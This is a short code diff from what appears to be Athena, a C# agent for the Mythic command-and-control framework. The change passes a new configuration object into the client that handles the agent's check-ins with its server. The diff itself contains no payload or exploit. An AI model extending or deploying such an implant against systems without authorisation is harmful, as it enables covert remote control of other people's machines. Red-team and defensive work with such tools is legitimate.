@@ -1,4 +1,5 @@
 ﻿using Athena.Commands;
+using Athena.Config;
 using Athena.Mythic.Model.Checkin;
 using Athena.Mythic.Model;
 using Athena.Utilities;
@@ -17,7 +18,8 @@ namespace Athena
             //1:36:39 for learning how to automatically generate the agents
 
             //MythicClient controls all of the agent communications
-            Globals.mc = new MythicClient();
+            MythicConfig conf = new MythicConfig();
+            Globals.mc = new MythicClient(conf);
             CheckinResponse res = Globals.mc.CheckIn();
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
             while(res.status != "success" || Globals.missedCheckins == Globals.maxMissedCheckins)
